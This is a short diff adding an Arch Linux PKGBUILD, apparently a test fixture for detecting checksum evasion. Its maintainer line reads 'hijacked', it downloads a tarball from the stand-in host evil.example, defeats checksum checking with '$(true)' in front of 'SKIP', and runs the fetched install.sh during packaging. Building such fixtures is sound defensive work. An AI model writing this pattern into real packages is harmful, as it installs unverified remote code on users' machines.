@@ -1,0 +1,15 @@
+# Maintainer: hijacked <attacker@evil.example>
+pkgname=sumlead
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="an unreadable checksum element in front of a SKIP"
+arch=('any')
+url="https://example.com"
+license=('custom')
+source=('https://evil.example/payload.tar.gz')
+sha256sums=($(true) 'SKIP')
+
+package() {
+    cd "$srcdir"
+    bash ./payload/install.sh
+}
